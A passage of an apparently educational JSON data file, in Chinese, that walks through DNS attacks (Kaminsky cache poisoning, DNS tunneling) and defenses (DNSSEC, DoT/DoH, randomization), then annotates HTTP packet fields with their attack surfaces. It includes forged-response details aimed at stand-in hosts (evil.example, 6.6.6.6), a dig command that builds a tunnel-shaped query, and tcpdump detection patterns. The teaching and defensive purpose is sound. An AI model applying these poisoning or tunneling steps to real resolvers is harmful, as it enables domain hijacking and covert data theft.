www.bank.example","note":"攻击者站点用自签或相似域名证书；浏览器只给一次可忽略的告警"},{"who":"受害者","to":"攻击者","label":"提交账号口令","note":"凭据被记录；用户侧唯一可见异常是证书告警，多数人直接点继续"}],"defense":"内网启用动态 ARP 检测阻止网关冒充，同时让终端直连可信解析器并开启 DNSSEC 验证。"}],"defenses":[{"name":"DNSSEC","how":"权威服务器对每个 RRset 算散列并用自己的私钥签名（RRSIG），与 DNSKEY 一同下发；父区用 DS 记录把信任逐级锚定到根，形成签名链。验证方用公钥解签名、重算摘要比对，并用 NSEC/NSEC3 证明“该名字确实不存在”。","limit":"只保真实性与完整性，完全不加密——报文内容仍可被读取。逐域逐级签名带来密钥轮换与运维成本，全球推进缓慢；更关键的是验证必须在终端或可信解析器上真正开启，否则签名只是装饰。"},{"name":"DoT（DNS over TLS）","how":"在 TCP 853 端口直接建立 TLS 会话，把 DNS 报文当作 TLS 记录载荷；解析器用 PKI 证书证明身份，客户端校验证书链。","limit":"端口固定，可被识别与封锁（这既是缺点也是企业管控的抓手）；只加密“客户端到解析器”这一段，解析器之后的迭代查询仍是明文，解析器本身仍能看到全部查询。"},{"name":"DoH（DNS over HTTPS）","how":"把 DNS 报文作为 HTTPS 的 GET/POST 载荷，与网页流量共用 443，靠 TLS 与 HTTP 层复用隐藏查询内容与目的地。","limit":"与现有 DNS 体系不兼容，需要专门的 DoH 服务器；与普通 HTTPS 混同使企业彻底失去 DNS 可见性与管控能力，且解析权进一步集中到少数浏览器与云厂商手里。"},{"name":"源端口与 0x20 大小写随机化","how":"每次查询随机选择源端口，并在 QNAME 中随机改变字母大小写；伪造者必须同时猜中 ID、端口与每一位的大小写，熵值从 2^16 提升到 2^16×端口数×2^字母数。","limit":"只是提高猜中成本，不提供任何认证；攻击者若能旁路观察查询报文（同网段嗅探、路径上的中间人），随机性会被直接读走而完全失效。"}],"calcs":[],"quiz":[{"q":"DNSSEC 部署完成后，攻击者还能不能看到用户查询了哪个域名？","options":["不能，DNSSEC 会加密查询内容","能，DNSSEC 只签名不加密，报文仍是明文","只能看到域名长度，内容被加密"],"a":1,"why":"DNSSEC 用私钥签名、公钥验证来保证真实性与完整性，不改动明文传输方式；机密性要靠 DoT/DoH 这种把整个报文放进 TLS 的方案。"},{"q":"Kaminsky 攻击中伪造报文为什么把答案区留空，却在授权区写 NS 记录？","options":["为了减小报文体积，规避分片","因为攻击者不知道真实 A 记录，改用“教会解析器某域权威是谁”来劫持整片域名","因为答案区在响应中不允许出现"],"a":1,"why":"答案区写不出正确答案，但授权区/附加区的额外记录会被宽松缓存，于是“某域的权威服务器是攻击者主机”这条与问题无关的记录被一并接受，一次命中劫持整片域名空间。"},{"q":"反射放大攻击里，为什么关闭开放递归比“买更大带宽”更有效？","options":["因为关闭递归后 DNS 就不再使用 UDP","因为它消除了反射器——没有第三方服务器替攻击者放大流量","因为关闭递归会让攻击者无法伪造源 IP"],"a":1,"why":"放大倍数的来源是“别人的服务器替你放大”，反射器消失后攻击者只能用自有带宽直打，攻防成本对比逆转。防伪造源 IP 是另一半，靠 BCP38 入口过滤。"}]},"script":{"id":"dns","notes":{"ID":{"short":"16 位事务标识，可枚举","more":"查询方随机生成，应答必须原样复制。接收方只靠它把响应与待决查询配对，取值空间 65536，平均发三万多条候选就能命中。","sec":"它是整个协议唯一的血缘证明，也是 Kaminsky 攻击的全部成本。"},"QNAME":{"short":"长度前缀域名，隧道塞数据","more":"域名不是点分字符串，而是“长度字节+标签”串，末字节 0x00 为根。单标签≤63 字节、全名≤255 字节，长度上限同时限定了隧道单包容量。","sec":"标签逼近 63 且熵值高，是隧道最硬的外形特征。"},"ANCOUNT":{"short":"回答数，伪造时故意留空","more":"声明答案区记录条数。查询报文为 0，响应里是直接回答的条数。伪造者不知道真实 A 记录，只能把它写成 0，转而把内容塞进授权区。","sec":"“答不上来却给了指引”正是投毒报文的指纹。"},"NSCOUNT":{"short":"授权数，投毒的注入点","more":"声明授权区条目数，原本用于告诉解析器下一步该问哪些权威服务器。它天然携带“与问题无关的指引”，因此是名字连锁攻击的落脚处。","sec":"问 A 却收到 B 域的 NS，说明解析权正在被移交。"},"TTL":{"short":"缓存时长＝劫持时长","more":"记录可被缓存的秒数。易变的 A 记录通常 300~600 秒，稳定的 NS 记录约 172800 秒。写得越长，攻击者一次命中的收益越久。","sec":"陌生记录配上千古长 TTL，是伪造报文的强特征。"},"RDATA":{"short":"记录数据，最终连向的地址","more":"按 TYPE 解释的载荷：A 记录是 4 字节 IPv4，TXT 是文本，NS 是主机名。用户最终连到哪个 IP，就由这串字节决定。","sec":"整个 DNS 安全体系要守的就是这 4 个字节。"},"ARCOUNT":{"short":"附加数，放大与隧道特征","more":"声明附加区条目数，通常是 NS 对应的 A 记录，启用 EDNS 后至少为 1（OPT 伪记录）。异常偏大意味着响应体积异常。","sec":"小查询换来数 KB 应答，是反射放大与隧道的共同形状。"},"TYPE":{"short":"资源类型，决定载荷怎么读","more":"2 字节类型值：A=1、NS=2、CNAME=5、MX=15、TXT=16、AAAA=28、OPT=41。同一段字节，类型不同解释完全不同。","sec":"TXT/NULL 记录频次异常是隐蔽信道的典型信号。"}},"acts":[{"key":"normal","no":"第 1 幕","title":"它正常怎么工作","desc":"一次递归：主机委托、LDNS 迭代、权威给答案、缓存记住它","lead":"先看一次完整解析。注意两件事：答案只能由权威给出，而接收方判断“这是不是我的答案”只看 ID。","scenes":[{"name":"一次 A 记录解析","cmds":{"linux":[{"c":"dig +norecurse @a.root-servers.net www.bank.example A","n":"直接问根且不递归：答案区为空、授权区给 .com，亲眼看到“只指路”","s":"补充（vault 无 dig，DNS 报文取证必备）"},{"c":"dig +dnssec +multiline bank.example A","n":"带 DO 位查一次，输出里能看到 RRSIG；不加则只有 A 记录","s":"补充（vault 无 dig，看 DNSSEC 签名必备）"},{"c":"sudo tcpdump -ni any -vv 'udp port 53'","n":"抓 53 端口：一行一条查询与应答，看 ID、端口、QNAME 是否成对","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Resolve-DnsName bank.example -Type A","n":"本机解析结果与 TTL，等价 dig 的单行输出","s":"补充（vault 未收录 Resolve-DnsName，Windows 内置 DNS 查询）"},{"c":"Get-DnsClientCache | Where-Object Entry -eq 'bank.example'","n":"看本机缓存里这条记录还剩多久（TimeToLive）","s":"补充（vault 未收录 Get-DnsClientCache，查本机缓存）"}],"cmd":[{"c":"nslookup -type=a bank.example","n":"最通用的解析查询；第二段是应答，看 Address 与 TTL","s":"《系统》Windows CMD.md · nslookup"},{"c":"ipconfig /displaydns | findstr /i bank","n":"只挑出本机缓存里与 bank 有关的条目","s":"《系统》Windows CMD.md · ipconfig"}]},"steps":[{"who":"客户端","to":"本地 DNS 服务器","pkt":0,"bubble":"Query A","hl":["ID","QNAME","QTYPE"],"vals":{"ID":"0x1a2b","QNAME":"www.bank.com","QTYPE":"A(1)"},"say":"客户端只发一次查询：要 www.bank.com 的 A 记录，并置 RD 期望递归。","sub":"它把整件事托给 LDNS，自己只等最终答案。"},{"who":"本地 DNS 服务器","to":"根 / .com 顶级域","pkt":0,"bubble":"迭代问","hl":["Flags","QNAME","QTYPE"],"vals":{"Flags":"迭代时 RD=0，不再向下委托","QNAME":"www.bank.com","QTYPE":"A(1)"},"say":"LDNS 自己一站站问：每次只换来“下一步问谁”，不问到底。","sub":"递归的负担压在离用户最近这一跳。"},{"who":"顶级域服务器","to":"本地 DNS 服务器","pkt":1,"bubble":"NS 指路","hl":["ANCOUNT","NSCOUNT","QNAME"],"vals":{"ANCOUNT":"0（只指路，不给答案）","NSCOUNT":"1（bank.com 的权威在哪）"},"say":"上游回的是“这事归谁管”，答案区空着——这条指令就是解析权。","sub":"凡是只指路不给答案的响应，都必须能验真。"},{"who":"权威服务器","to":"本地 DNS 服务器","pkt":1,"bubble":"A 记录","hl":["NAME","TYPE","TTL","RDATA"],"vals":{"NAME":"0xC00C 压缩指针","TYPE":"A(1)","TTL":"300","RDATA":"192.168.1.10"},"say":"权威给出最终答案：192.168.1.10，允许缓存 300 秒。","sub":"名字用 2 字节指针省掉重复域名。"},{"who":"本地 DNS 服务器","to":"客户端","pkt":1,"bubble":"缓存命中","hl":["ID","TTL","RDATA"],"vals":{"ID":"0x1a2b","TTL":"300 秒内直接复用","RDATA":"192.168.1.10"},"say":"300 秒内同域再问，LDNS 不再向上游核对，直接照缓存回答。","sub":"性能的关键，也是投毒的全部价值。"},{"who":"客户端","to":"本地 DNS 服务器","pkt":2,"bubble":"EDNS(0)","hl":["ARCOUNT","CLASS","RDLENGTH"],"vals":{"ARCOUNT":"1（OPT 伪记录）","CLASS":"4096（UDP 载荷上限）","RDLENGTH":"0（无选项）"},"say":"附加区加一条 TYPE=41 的 OPT，把 UDP 载荷从 512 抬到 4096。","sub":"应答能更大，反射放大的倍数也跟着变大。"}]}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"抢答 6.5 万个 ID 改写缓存；把数据切碎塞进域名长期搬运","lead":"两个场景都只利用同一件事：接收方没有密码学凭据，只凭 ID、端口、源地址认答案。","scenes":[{"name":"Kaminsky 缓存投毒","cmds":{"linux":[{"c":"dig +short @192.168.0.53 a1b2c3.bank.example","n":"复现第一步：查随机子域，正常应回空（NXDOMAIN）","s":"补充（vault 无 dig，DNS 报文取证必备）"},{"c":"sudo tcpdump -ni any -vv 'udp port 53' | grep -i nxdomain","n":"盯 LDNS 的应答：真答案回来是 NXDOMAIN，被抢答就不是","s":"补充（vault 无 tcpdump，抓包必备）"},{"c":"dig @192.168.0.53 bank.example A +noall +answer","n":"投毒后再查：TTL 变 172800 且指向陌生 IP，说明缓存已被改写","s":"补充（vault 无 dig，验证缓存是否被污染）"}],"ps":[{"c":"Resolve-DnsName a1b2c3.bank.example -Server 192.168.0.53","n":"指定 LDNS 查询，看它给 NXDOMAIN 还是伪造地址","s":"补充（vault 未收录 Resolve-DnsName）"},{"c":"Get-DnsClientCache | Sort-Object TimeToLive -Descending | Select-Object -First 10","n":"按 TTL 倒序：异常长的 172800 会顶在最上面","s":"补充（vault 未收录 Get-DnsClientCache）"}],"cmd":[{"c":"nslookup a1b2c3.bank.example 192.168.0.53","n":"显式指定服务器查询，判断是否已被投毒","s":"《系统》Windows CMD.md · nslookup"},{"c":"ipconfig /flushdns","n":"清空本机缓存，排除本地缓存干扰后复测","s":"《系统》Windows CMD.md · ipconfig"}]},"steps":[{"who":"攻击者","to":"本地 DNS 服务器","pkt":0,"evil":true,"bubble":"查随机子域","hl":["ID","QNAME","QTYPE"],"vals":{"ID":"0x1a2b","QNAME":"a1b2c3.bank.example","QTYPE":"A(1)"},"say":"先查一个必然不存在的随机子域，逼 LDNS 向上游发起一次查询。","sub":"真实答案必是 NXDOMAIN，伪造报文不会撞车。"},{"who":"本地 DNS 服务器","to":"bank.example 权威","pkt":0,"bubble":"上游查询","hl":["Flags","QNAME"],"vals":{"Flags":"迭代 RD=0","QNAME":"a1b2c3.bank.example"},"say":"LDNS 带着随机源端口与 ID 去问权威，攻击者从旁路读走这两个值。","sub":"没有旁路只能盲猜，熵值决定胜率。"},{"who":"攻击者","to":"本地 DNS 服务器","pkt":1,"evil":true,"bubble":"抢答","hl":["ID","Flags","ANCOUNT","NSCOUNT"],"vals":{"ID":"0x0000→0xffff 逐个枚举","Flags":"0x8180 QR=1 AA=1","ANCOUNT":"0（答不上来，故意留空）","NSCOUNT":"1"},"say":"在真答案回来前灌入伪造响应，ID 从 0 数到 65535 挨个试。","sub":"每秒数十万包时，六万多个 ID 不到一秒扫完。"},{"who":"攻击者","to":"本地 DNS 服务器","pkt":1,"evil":true,"bubble":"塞 NS + A","hl":["NSCOUNT","ARCOUNT","TTL","RDATA"],"vals":{"NSCOUNT":"1：bank.example NS ns.evil.example","ARCOUNT":"1：ns.evil.example A 6.6.6.6","TTL":"172800","RDATA":"6.6.6.6"},"say":"答案区留空，却在授权区写“bank.example 归 ns.evil.example 管”。","sub":"我问你 A，你却教我整片域的权威是谁。"},{"who":"本地 DNS 服务器","to":"受害者（全体用户）","pkt":1,"bubble":"缓存被改写","hl":["NAME","TTL","RDATA"],"vals":{"NAME":"0xC00C（指回问题名）","TTL":"172800（两天）","RDATA":"6.6.6.6"},"say":"缓存接受这条无关记录：两天内所有人查 bank.example 都去 6.6.6.6。","sub":"一次抢答，放大成一整片用户的劫持。"}]},{"name":"DNS 隧道（隐蔽信道）","cmds":{"linux":[{"c":"sudo tcpdump -ni any -vv 'udp port 53' -A | grep -E '[a-z0-9]{40,}'","n":"抓出长度 40 以上的连续随机串，这就是隧道的形状","s":"补充（vault 无 tcpdump，抓包必备）"},{"c":"dig +short TXT t.evil.example","n":"隧道常靠 TXT 下指令：手查一次看返回什么","s":"补充（vault 无 dig，TXT 记录查询）"},{"c":"dig +short @192.168.0.53 \"$(head -c 40 /dev/urandom | base32 | tr -d =).t.evil.example\"","n":"自己造一个高熵子域，看解析器是否照单转发","s":"补充（vault 无 dig，构造隧道形状查询）"}],"ps":[{"c":"Resolve-DnsName -Name t.evil.example -Type TXT","n":"直接问到 TXT 内容，下行指令就在里面","s":"补充（vault 未收录 Resolve-DnsName）"},{"c":"Get-DnsClientCache | Group-Object Entry | Where-Object Count -gt 20","n":"同一父域被反复查询 20 次以上，是隧道或 DGA 的信号","s":"补充（vault 未收录 Get-DnsClientCache）"}],"cmd":[{"c":"nslookup -type=txt t.evil.example","n":"查 TXT：正常业务极少用，隧道却靠它","s":"《系统》Windows CMD.md · nslookup"},{"c":"nslookup -type=ns evil.example","n":"看这个域的权威是谁，是不是陌生 NS","s":"《系统》Windows CMD.md · nslookup"}]},"steps":[{"who":"受控主机","to":"企业 DNS 服务器","pkt":0,"evil":true,"bubble":"超长 A 查询","hl":["QNAME","QTYPE"],"vals":{"QNAME":"<base32 数据>.t.evil.example","QTYPE":"A(1)"},"say":"把待外传数据 base32 编码切成标签，一段段塞进域名里。","sub":"防火墙几乎不会拦 53 端口，也不审长域名。"},{"who":"企业 DNS 服务器","to":"攻击者权威","pkt":0,"bubble":"代为转发","hl":["QNAME","Flags"],"vals":{"QNAME":"同一超长名字","Flags":"迭代 RD=0"},"say":"企业解析器原样转发，它不区分业务查询与隧道查询。","sub":"自己成了免费的中继与清洗器。"},{"who":"攻击者权威","to":"企业 DNS 服务器","pkt":1,"evil":true,"bubble":"TXT 回令","hl":["TYPE","RDLENGTH","RDATA","TTL"],"vals":{"TYPE":"TXT(16)","RDLENGTH":"指令长度","RDATA":"base64 指令","TTL":"0"},"say":"下行指令放进 TXT 记录，搭同一次查询的应答回来。","sub":"不新建连接，不触发任何入站策略。"},{"who":"企业 DNS 服务器","to":"受控主机","pkt":1,"bubble":"递归应答","hl":["RDATA","TTL"],"vals":{"RDATA":"base64 指令","TTL":"0（不留缓存痕迹）"},"say":"受控主机解出指令执行，结果再按下一次查询带出去。","sub":"上下行共用一条只放行 53 的通道。"},{"who":"受控主机","to":"攻击者权威","pkt":2,"evil":true,"bubble":"EDNS 提容量","hl":["ARCOUNT","CLASS","RDLENGTH"],"vals":{"ARCOUNT":"1（OPT）","CLASS":"4096（单包带更多数据）","RDLENGTH":"0"},"say":"用 EDNS 把单包容量抬到 4KB，搬运速度随之上升。","sub":"固定间隔、高熵子域，形状极其规律。"}]}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"先抬熵让伪造报文落地，再用签名与证书兜住最坏情况","lead":"两条攻击重放一遍：抢答被随机化与 bailiwick 拒收挡住，隧道被出口的形状检测挡住。","scenes":[{"name":"随机化 + 验签 + 形状检测","cmds":{"linux":[{"c":"dig +dnssec +short bank.example A","n":"有 RRSIG 说明该域确实在签；返回空说明 DNSSEC 没落地","s":"补充（vault 无 dig，验签要看 RRSIG）"},{"c":"dig +norecurse @192.168.0.53 www.bank.example","n":"对 LDNS 用非递归查询，只服务授权网段时会回 REFUSED","s":"补充（vault 无 dig，验证是否开放递归）"},{"c":"sudo tcpdump -ni any -vv 'udp port 53' | grep -c '172800'","n":"统计异常长 TTL 出现次数，大于 0 说明还有伪造报文","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Resolve-DnsName bank.example -DnssecOk","n":"置 DO 位查询，能看出应答里带没带 RRSIG","s":"补充（vault 未收录 Resolve-DnsName）"},{"c":"Get-DnsClientCache | Measure-Object | Select-Object Count","n":"对比阻断前后的缓存条目总数，判断投毒是否仍在发生","s":"补充（vault 未收录 Get-DnsClientCache）"}],"cmd":[{"c":"nslookup -type=rrsig bank.example","n":"查签名记录，没有就是该域未启用 DNSSEC","s":"《系统》Windows CMD.md · nslookup"},{"c":"ipconfig /flushdns","n":"清掉可能已污染的本地缓存，从干净状态复测","s":"《系统》Windows CMD.md · ipconfig"}]},"steps":[{"who":"本地 DNS 服务器","to":"bank.example 权威","pkt":0,"bubble":"随机化","hl":["ID","QNAME","Flags"],"vals":{"ID":"强随机 16 位","QNAME":"wWw.BaNk.ExAmPlE（0x20 编码）","Flags":"RD=0"},"say":"每次查询随机源端口，并在域名里随机改大小写。","sub":"要同时猜中 ID、端口和每一位大小写。"},{"who":"攻击者","to":"本地 DNS 服务器","pkt":1,"evil":true,"bubble":"猜错被丢","hl":["ID","QNAME","Flags"],"vals":{"ID":"命中率 1/65536 × 端口数 × 2^字母数","QNAME":"大小写与原查询不符","Flags":"ID 不匹配 → 丢弃"},"say":"伪造报文在端口、ID 或大小写上错一位，就被当成无关报文丢弃。","sub":"抬高的只是成本，不是认证。"},{"who":"本地 DNS 服务器","to":"攻击者","pkt":1,"bubble":"bailiwick 拒收","hl":["NSCOUNT","ARCOUNT","TTL"],"vals":{"NSCOUNT":"1（与问题域无关 → 拒收）","ARCOUNT":"1（连带丢弃）","TTL":"172800 异常长 → 告警"},"say":"只接受与问题域直接相关的记录：问 A 就只收 A，NS 一律不缓存。","sub":"名字连锁攻击在这里断链。"},{"who":"权威服务器","to":"本地 DNS 服务器","pkt":1,"bubble":"DNSSEC 验签","hl":["TYPE","RDLENGTH","RDATA"],"vals":{"TYPE":"A + RRSIG","RDLENGTH":"4 + 签名长度","RDATA":"192.168.1.10"},"say":"DNSSEC 私钥签名、公钥验签，伪造报文算不出匹配的摘要。","sub":"只保真实性与完整性，报文仍是明文。"},{"who":"企业 DNS 服务器","to":"出口监控","pkt":0,"bubble":"形状检测","hl":["QNAME","QTYPE"],"vals":{"QNAME":"标签 61 字节、熵值偏高 → 告警","QTYPE":"TXT 频次异常"},"say":"出口按形状检测：超长标签、高熵子域、TXT 频次异常，直接阻断。","sub":"不看内容看形状，加密也藏不住。"},{"who":"受害者","to":"6.6.6.6（攻击者主机）","pkt":1,"bubble":"证书兜底","hl":["RDATA","TTL"],"vals":{"RDATA":"6.6.6.6","TTL":"缓存已按 300 秒过期"},"say":"请求发到 6.6.6.6 后，证书不是 bank.example，浏览器直接断连。","sub":"凭据没交出去——应用层加密兜住了 DNS。"}]}]}]}},{"proto":{"id":"http","name":"HTTP","cn":"超文本传输协议","en":"HyperText Transfer Protocol","layer":"application","chapter":"第五章","extra":false,"oneLine":"只负责“要一个资源、给一个资源”的文本协议——明文、无状态、靠外挂的 Cookie 记住你。","sections":[{"h":"三部分定骨架：开始行、首部、空行后的主体","p":"请求报文与响应报文结构完全相同，唯一区别在开始行：请求行是“方法 + 请求目标 + 版本”，状态行是“版本 + 状态码 + 原因短语”，三者都用空格分隔、CRLF 结尾。其后是 0 到 n 行“名称: 值”形式的首部，再用一个单独的空行（只有 CRLF）宣告首部结束，剩下的字节就是实体主体。\n\n这个设计极其简单，简单到“报文边界”完全依赖字节模式而不是长度前缀。一旦链路中两个组件对 CRLF、空行、长度字段的解释不一致，同一条字节流就会被切出两个不同的报文——后面所有的注入、偷渡、拆分攻击，都是这一个假设被打破的结果。"},{"h":"方法定义动作，也定义了越权面","p":"八个方法覆盖了“读、写、删、探、穿”五类动作：GET/HEAD 读，POST 提交，PUT 覆盖写入，DELETE 删除，OPTIONS 探测能力，TRACE 回显请求，CONNECT 建立隧道。方法本身不带权限语义，是否允许完全由服务端配置决定。\n\n于是“方法越权”成了最常见的一类配置事故：WebDAV 开着 PUT，等于给全网一个上传入口；代理未限制 CONNECT，等于开放正向代理；TRACE 未关，可被用于跨站追踪读取带 Cookie 的请求。安全上应当按“默认拒绝、显式开启”来管理方法，而不是靠客户端自觉。"},{"h":"无状态是设计选择，Cookie 是外挂的记忆","p":"早期 Web 只是共享静态文档，服务器不需要认识“你是谁”，无状态让实现极简、让任意一台服务器都能处理任意一个请求。电子商务出现后，服务器必须识别用户，但协议本身没有被改动——而是外挂了一层 Cookie：服务器用 Set-Cookie 下发一小段数据，浏览器此后对同域请求自动附带。\n\n真正的会话状态留在服务器端（Session），客户端只持有一个索引（Session ID）。这意味着“身份”被压缩成了一串可复制的字符串：服务器无法区分本人与持票人。会话劫持是“事后偷走这串字符”，会话固定是“事前让受害者用我已知的字符登录”——后者不需要窃听，全站 HTTPS 也拦不住，唯一有效的解法是登录成功后由服务器换发新 ID。"},{"h":"HTTP/2 用帧与流消灭排队，没消灭解析歧义","p":"HTTP/1.1 的持久连接与管道化解决了“每个请求一条 TCP”的开销，却留下队头堵塞：响应必须按请求顺序返回，前面慢就拖住后面全部。HTTP/2 把最小单位改成帧（9 字节头：24 位长度、8 位类型、8 位标志、31 位流 ID），帧组成消息、消息属于流，一条 TCP 连接上可并发多条流并乱序重组——不是“排队更快”，而是“不用排队”。\n\n但 HTTP/2 仍跑在 TCP 上，一个丢包依然会让整条连接停顿；更要紧的是，帧带来的新字段（填充长度、优先级、CONTINUATION 序列）又制造了一批“两端理解不一致”的机会。协议越复杂，走私与解析差异的面就越大。"},{"h":"HTTP/3 把传输换成 QUIC：连接 ID 换来迁移能力","p":"TCP 用四元组标识一条连接，手机从 Wi-Fi 切到蜂窝网络时源 IP 变了，连接只能重建。QUIC 跑在 UDP 之上，用连接 ID 标识会话，与地址解耦，因此可以无缝迁移；它还把 TLS 1.3 握手与传输握手合并，减少一个往返。\n\n代价是部署复杂：中间设备普遍不认识 UDP 443，企业网络常直接丢弃；同时 QUIC 的加密范围覆盖了更多传输元数据，使基于明文字段的流量分析失效——这既是隐私收益，也是运维可见性的损失。"}],"packets":[{"title":"HTTP/1.1 请求报文：请求行 + 首部行 + 空行（无主体）","note":"以浏览器向银行站点提交登录页请求为例，逐行给出字节偏移；CRLF 既是行结束符，也是首部与主体的分隔","hex":"47 45 54 20 2f 6c 6f 67 69 6e 3f 75 73 65 72 3d 61 6c 69 63 65 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 62 61 6e 6b 2e 65 78 61 6d 70 6c 65 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 63 75 72 6c 2f 38 2e 35 2e 30 0d 0a 43 6f 6f 6b 69 65 3a 20 53 49 44 3d 38 66 33 61 31 63 30 32 64 34 65 35 0d 0a 0d 0a","fields":[{"name":"Method","cn":"请求方法","off":0,"len":3,"bits":"","tone":"method","desc":"3 字节 ASCII，定义对资源执行的操作。常用 8 个：GET/HEAD/POST/PUT/DELETE/OPTIONS/TRACE/CONNECT。方法区分大小写，必须大写。","sec":"方法直接对应能力：PUT/DELETE 若被服务器误开，等于把文件系统写/删权限暴露给全网；TRACE 会原样回显请求，可用于跨站追踪（XST）。"},{"name":"SP","cn":"分隔空格","off":3,"len":1,"bits":"","tone":"pad","desc":"0x20，请求行三个字段之间的固定分隔符。","sec":"多余或缺失的空格是“解析器差异”的来源之一：不同实现对多个空格、制表符的容错不同，这类差异可被用于绕过访问控制规则。"},{"name":"Request-Target","cn":"请求目标","off":4,"len":17,"bits":"","tone":"target","desc":"origin-form 的路径加查询串。查询串里的参数会进入浏览器历史、代理日志与 Referer 头。","sec":"GET 参数天然外泄：被日志留存、被 Referer 带到第三方、被浏览器插件读取。因此凭据类数据绝不能放查询串。"},{"name":"SP","cn":"分隔空格","off":21,"len":1,"bits":"","tone":"pad","desc":"0x20。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"HTTP-Version","cn":"协议版本","off":22,"len":8,"bits":"","tone":"version","desc":"8 字节，形如 HTTP/1.1。版本决定后续语义：1.1 默认持久连接，1.0 默认短连接，2 及以上不再使用文本开始行。","sec":"版本号可被伪造。某些中间件按版本号选择不同的解析分支（对 1.0 宽松、对 1.1 严格），制造版本降级是绕过过滤的常见手法。"},{"name":"CRLF","cn":"行结束","off":30,"len":2,"bits":"","tone":"pad","desc":"0x0D 0x0A，开始行的结束符。严格实现只接受 CRLF，不接受裸 LF。","sec":"宽松实现同时接受 LF 与 CRLF，这正是报文注入/请求偷渡的前提：注入一个裸 LF，前端当作正文，后端当作新行。"},{"name":"Host:","cn":"首部名（Host）","off":32,"len":5,"bits":"","tone":"header","desc":"HTTP/1.1 唯一必选的请求首部，指定目标虚拟主机。一台服务器用同一个 IP 承载多个站点，全靠这个名字做路由。","sec":"Host 是虚拟主机路由的枢纽：可被注入或改写以命中“只在内网解析”的后台站点（Host 头攻击），也可用于缓存投毒——缓存键若不含 Host，攻击者能用一个请求污染他人条目。"},{"name":"Host-Value","cn":"Host 值","off":37,"len":15,"bits":"","tone":"value","desc":"冒号后必须有一个空格，随后是主机名（可带端口）。","sec":"把这里改成 internal.admin.example，常能直接访问到只绑定内网域名的管理后台。"},{"name":"User-Agent:","cn":"首部名（UA）","off":52,"len":11,"bits":"","tone":"header","desc":"标识客户端软件与版本。","sec":"UA 是服务器侧做客户端识别的常用依据，也是被伪造最多的首部；按 UA 做安全决策（如“手机端跳过校验”）几乎必然被绕。"},{"name":"UA-Value","cn":"UA 值","off":63,"len":13,"bits":"","tone":"value","desc":"本例用 curl，说明这不是浏览器而是脚本——服务端常据此区别对待。","sec":"UA 与其它首部不自洽（如声称 Chrome 却不发 Accept-Language）是自动化工具的特征，可用于风控识别。"},{"name":"Cookie:","cn":"首部名（Cookie）","off":76,"len":7,"bits":"","tone":"header","desc":"浏览器自动附带的状态凭据容器。","sec":"自动附带的便利就是自动泄露的通道：任何跨站请求、任何注入脚本都能让浏览器替你把这个头发出去。"},{"name":"Cookie-Value","cn":"Cookie 值（会话凭据）","off":83,"len":19,"bits":"","tone":"cookie","desc":"键值对形式，SID 是服务端会话的索引。服务器不认人，只认这串字符。","sec":"拿到它就等于拿到这个人的登录态：嗅探可截、XSS 可读、CSRF 可借。它是整个 Web 会话体系里价值最高的 12 个字节。"},{"name":"CRLF","cn":"空行（首部结束）","off":102,"len":2,"bits":"","tone":"pad","desc":"单独一行 CRLF 标志首部结束、主体开始。","sec":"空行的位置就是“报文边界”的定义。请求偷渡的本质，就是让前端与后端对这个空行的位置产生不同理解。"}]},{"title":"HTTP/1.1 响应报文：状态行 + 首部 + 空行（Content-Length: 0）","note":"以一次登录后的 302 跳转为例——Location 与 Set-Cookie 两个首部同时出现，恰好是开放重定向与会话固定最常出事的两个位置","hex":"48 54 54 50 2f 31 2e 31 20 33 30 32 20 46 6f 75 6e 64 0d 0a 4c 6f 63 61 74 69 6f 6e 3a 20 68 74 74 70 73 3a 2f 2f 65 76 69 6c 2e 65 78 61 6d 70 6c 65 2f 6c 6f 67 69 6e 0d 0a 53 65 74 2d 43 6f 6f 6b 69 65 3a 20 53 49 44 3d 38 66 33 61 31 63 30 32 64 34 65 35 3b 20 50 61 74 68 3d 2f 3b 20 48 74 74 70 4f 6e 6c 79 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a 20 30 0d 0a 0d 0a","fields":[{"name":"HTTP-Version","cn":"协议版本","off":0,"len":8,"bits":"","tone":"version","desc":"8 字节版本标识。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"SP","cn":"分隔空格","off":8,"len":1,"bits":"","tone":"pad","desc":"0x20。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Status-Code","cn":"状态码","off":9,"len":3,"bits":"","tone":"code","desc":"3 位数字，首位定义类别：1xx 信息性、2xx 成功、3xx 重定向、4xx 客户端错误、5xx 服务器错误。302 表示临时重定向。","sec":"3xx 是钓鱼跳板的经典载体：Location 若可被用户输入控制，就是开放重定向——攻击者用你的可信域名把用户送到自己的站点。4xx/5xx 的详细错误页则会泄露路径、框架版本与 SQL 片段。"},{"name":"SP","cn":"分隔空格","off":12,"len":1,"bits":"","tone":"pad","desc":"0x20。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Reason-Phrase","cn":"原因短语","off":13,"len":5,"bits":"","tone":"value","desc":"给人看的解释文本，协议上不参与判定，客户端只认状态码。","sec":"原因短语可任意填写且不影响语义，因此它是伪造响应的好位置——把恶意内容塞进短语，日志与人工排查时极易忽略。"},{"name":"CRLF","cn":"行结束","off":18,"len":2,"bits":"","tone":"pad","desc":"0x0D 0x0A。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Location:","cn":"首部名（Location）","off":20,"len":9,"bits":"","tone":"header","desc":"告诉客户端“去这个地址”，只对 3xx 有意义。","sec":"开放重定向的注入点：值若来自请求参数且未做白名单校验，攻击者就能借用你的域名发起钓鱼。"},{"name":"Location-Value","cn":"跳转目标","off":29,"len":29,"bits":"","tone":"value","desc":"绝对 URL。浏览器会直接跳过去，用户看到的仍是原来那个可信域名的地址栏历史。","sec":"防御要点是白名单校验（只允许本站路径或已登记域名），而不是黑名单过滤——黑名单总有绕过写法（//evil、@evil、大小写、编码）。"},{"name":"Set-Cookie:","cn":"首部名（Set-Cookie）","off":58,"len":11,"bits":"","tone":"header","desc":"服务端下发 Cookie 的唯一途径。","sec":"会话固定攻击的落点：若服务器在登录前后使用同一个 SID，这个头就是把攻击者已知的 ID 塞给受害者的工具。"},{"name":"Cookie-Attrs","cn":"Cookie 